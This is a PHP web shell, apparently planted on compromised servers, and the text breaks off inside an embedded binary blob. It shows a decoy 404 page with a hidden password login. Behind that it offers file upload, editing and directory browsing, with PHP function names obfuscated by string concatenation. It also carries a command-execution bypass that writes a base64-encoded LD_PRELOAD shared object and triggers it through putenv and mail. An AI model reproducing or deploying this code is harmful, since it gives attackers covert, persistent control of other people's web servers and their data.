    <?php
    error_reporting(0);
    ob_start();
    session_start();
    ob_end_flush();
    $passhash = "b88c7fea9896501b7f7374433859032c";
    if(!isset($_SESSION['logged']) || $_SESSION['logged'] !== true) {
        if(isset($_POST['loginp'])) {
            if(md5($_POST['loginp']) === $passhash) {
                $_SESSION['logged'] = true;
                header('Location: '.$_SERVER['PHP_SELF']);
                exit;
            } else {
                die('<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL / was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr><form method="post" style="position:fixed;bottom:5px;right:5px"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="loginp"></form></body></html>');
            }
        } else {
            die('<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL / was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr><form method="post" style="position:fixed;bottom:5px;right:5px"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="loginp"></form></body></html>');
        }
    }
    if(isset($_GET['logout'])) {
        session_destroy();
        die('<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL / was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr><form method="post" style="position:fixed;bottom:5px;right:5px"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="loginp"></form></body></html>');
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <title>Remorse Cyberia</title>
    <meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300..700&display=swap" rel="stylesheet">
    <style>
    body{font-family:"Space Grotesk",sans-serif;color:#fff;margin:0;padding:0;background-color:#000}.result-box-container{position:relative;margin-top:20px}.result-box{width:100%;height:200px;padding:10px;border:1px solid #ddd;border-radius:5px;background-color:#333;overflow:auto;box-sizing:border-box;font-family:"Space Grotesk",sans-serif;color:#fff;resize:both;min-height:100px;max-height:500px}.result-box::placeholder{color:#999}.result-box:focus{outline:none;border-color:#fff}.result-box::-webkit-scrollbar{width:8px}.result-box::-webkit-scrollbar-thumb{background-color:#53585d;border-radius:4px}.container{max-width:90%;margin:20px auto;padding:20px;background-color:#1a1a1a;border-radius:44px;box-shadow:0 0 10px rgba(255,255,255,0.1)}.header{text-align:center;margin-bottom:20px}.header h1{font-size:24px;color:#fff}.subheader{text-align:center;margin-bottom:20px}.subheader p{font-size:16px;font-style:italic;color:#ccc}form{margin-bottom:20px}form input[type="text"],form textarea{padding:8px;margin-bottom:10px;border:1px solid #fff;border-radius:3px;box-sizing:border-box;background-color:#333;color:#fff}form input[type="submit"]{padding:10px;background-color:#53585d;color:white;border:none;border-radius:3px;cursor:pointer}form input[type="file"]{padding:7px;background-color:#53585d;color:white;border:none;border-radius:3px;cursor:pointer}form input[type="submit"]:hover{background-color:#00a806}.result-box{width:100%;height:400px;resize:none;overflow:auto;font-family:'Arial Black';background-color:#333;color:#fff;padding:10px;border:1px solid #ddd;margin-bottom:10px}table{width:100%;border-collapse:collapse;margin-top:20px;color:#fff}th,td{padding:8px;text-align:left}th{background-color:#444}tr:nth-child(even){background-color:#333}.item-name{max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.size,.date{width:100px}.permission{font-weight:bold;width:50px;text-align:center}.writable{color:#0db202}.not-writable{color:#d60909}textarea[name="file_content"]{width:calc(100.9% - 10px);margin-bottom:10px;padding:8px;max-height:500px;resize:vertical;border:1px solid #ddd;border-radius:3px;font-family:'Arial Black';background-color:#333;color:#fff}a{color:#00ff00;text-decoration:none}a:hover{color:#b3ffb3}
    </style>
    </head>
    <body>
    <div class="container">
    <?php
    $chd = "c"."h"."d"."i"."r";
    $expl = "e"."x"."p"."l"."o"."d"."e";
    $scd = "s"."c"."a"."n"."d"."i"."r";
    $ril = "r"."e"."a"."l"."p"."a"."t"."h";
    $st = "s"."t"."a"."t";
    $cpy = "c"."o"."p"."y";
    $isdir = "i"."s"."_"."d"."i"."r";
    $isw = "i"."s"."_"."w"."r"."i"."t"."a"."b"."l"."e";
    $mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
    $bs = "b"."a"."s"."e"."n"."a"."m"."e";
    $htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
    $fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $mek = "m"."k"."d"."i"."r";
    $fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $drnmm = "d"."i"."r"."n"."a"."m"."e";
    $unl = "u"."n"."l"."i"."n"."k";
    $timezone = date_default_timezone_get();
    date_default_timezone_set($timezone);
    $rootdirs = $ril($_SERVER['\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54']);
    $scriptdirs = $drnmm(__FILE__);

    function x($b) {

        $be = "ba"."se"."64"."_"."en"."co"."de";
        return $be($b);
    }

    function y($b) {
        $bd = "ba"."se"."64"."_"."de"."co"."de";
        return $bd($b);
    }
    if(function_exists('mail')) {
        $mail = "<font color='white'> [ mail :</font><font color='lime'> 0N </font> ] ";
    } else {
        $mail = "<font color='white'> [ mail :</font><font color='red'> 0FF </font> ] ";
    }
    if(function_exists('mb_send_mail')) {
    $mbb = "<font color='white'> [ mb_send_mail :</font><font color='lime'> 0N </font> ] ";
    }else{
    $mbb = "<font color='white'> [ mb_send_mail :</font><font color='red'> 0FF </font> ] ";
    }
    if(function_exists('error_log')) {
    $errr = "<font color='white'> [ error_log :</font><font color='lime'> 0N </font> ] ";
    }else{
    $errr = "<font color='white'> [ error_log :</font><font color='red'> 0FF </font> ] ";
    }
    if(function_exists('imap_mail')) {
    $impp = "<font color='white'> [ imap_mail :</font><font color='lime'> 0N </font> ] ";
    }else{
    $impp = "<font color='white'> [ imap_mail :</font><font color='red'> 0FF </font> ] <br>";
    }

    echo "<font color='white'> [ C0mm4nd BYP4SS! <i style='color:gray'>status wajib on mail putenv</i>  ]</font><br>";
    if (function_exists('mail')) {
        echo $mail." ".$mbb." ".$errr." ".$impp;
    } else {
        echo $mail." ".$mbb." ".$errr." ".$impp;
    }
    if (function_exists('putenv')) {
        echo "<font color='white'> [ Function putenv :</font><font color='lime'> 0N </font> ] <br>";
    } else {
        echo "<font color='white'> [ Function putenv :<font color='red'> 0FF </font> ] <br>";
    }
    foreach ($_GET as $c => $d) $_GET[$c] = y($d);

    $curdirec = $ril(isset($_GET['d']) ? $_GET['d'] : $rootdirs);
    $chd($curdirec);

    $viecmprs = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['filetos'])) {
            $file_name = $bs($_FILES["filetos"]["name"]);
            $target_file = $curdirec . '/' . $file_name;
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
            $host = $_SERVER['HTTP_HOST'];
            $path = dirname($_SERVER['PHP_SELF']);
            $url_to_file = $protocol . $host . $path . '/' . $file_name;
            if ($mup($_FILES["filetos"]["tmp_name"], $target_file) && filesize($target_file) > 0) {
                echo "<p><i style=color:red;>" . $htm($file_name) . "</i> OK - <a href='" . $url_to_file . "'>Click here!</a><br>";
            }
            elseif (@$cpy($_FILES["filetos"]["tmp_name"], $target_file) && filesize($target_file) > 0) {
                echo "<p><i style=color:red;>" . $htm($file_name) . "</i> OK - <a href='" . $url_to_file . "'>Click here!</a><br>";
            }
            elseif ($fpc($target_file, $fgc($_FILES["filetos"]["tmp_name"])) && filesize($target_file) > 0) {
                echo "<p><i style=color:red;>" . $htm($file_name) . "</i> OK - <a href='" . $url_to_file . "'>Click here!</a><br>";
            } else {
                echo "<p>Failed!</p>";
            }
        }
        
    elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $ff = $_POST['folder_name'];
            $newfldr = $curdirec . '/' . $ff;
            if (!file_exists($newfolder)) {
                if ($mek($newfldr) !== false) {
                    echo '<p>Dir created</p>';
                }else{
                    echo '<p>ERR: Failed to create dir</p>';
                }
            }

        } elseif (isset($_POST['file_name'])) {
            $filename = $_POST['file_name'];
            $newfile = $curdirec . '/' . $filename;
            if (!file_exists($newfile)) {
                if ($fpc($newfile, '') !== false) {
                    echo '<p><i style=color:red;>' . $filename .'</i> Created</p>';
                    $viefis = $newfile;
                    if (file_exists($viefis)) {
                        $filecont = $fgc($viefis);
                        $viecmprs = '<br><p>Result: ' . $filename . '</p>
                        <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
                        <textarea name="content" class="result-box">' . $htm($filecont) . '</textarea><td>
                        <input type="hidden" name="edit_file" value="' . $filename . '">
                        <input type="submit" value=" Save "></form></td>';
                    } else {
                        $viecmprs = '<p>File not found</p>';
                    }
                } else {
                    echo '<p>Failed create file</p>';
                }
            }else{
                echo '<p>File already exists</p>';
            }
        } elseif (isset($_POST['cmydinpt'])){
            $p = "p"."u"."t"."e"."n"."v";
            $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
            $m = "m"."a"."i"."l";
            $base = "ba"."se"."64"."_"."de"."co"."de";
            $en = "ba"."se"."64"."_"."en"."co"."de";
            $mb = "m"."b"."_"."s"."e"."n"."d"."_"."m"."a"."i"."l";
            $err = "e"."r"."r"."o"."r"."_"."l"."o"."g";
            $drnm = "d"."i"."r"."n"."a"."m"."e";
            $imp = "i"."m"."a"."p"."_"."m"."a"."i"."l";
            $auahs = $_SERVER['PHP_SELF'];
            $doc = $_SERVER['DOCUMENT_ROOT'];
            $geles = $drnm($auahs);
            $full = $doc . $geles;
            $hook = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAA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